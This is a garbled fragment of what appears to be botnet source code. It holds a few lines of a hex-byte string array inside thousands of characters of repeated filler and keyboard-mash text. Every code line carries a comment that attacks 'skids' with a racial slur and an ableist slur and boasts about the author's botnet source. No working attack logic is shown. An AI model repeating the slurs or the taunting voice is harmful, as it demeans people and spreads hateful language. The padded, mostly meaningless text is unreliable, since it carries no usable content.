UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");// done//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9U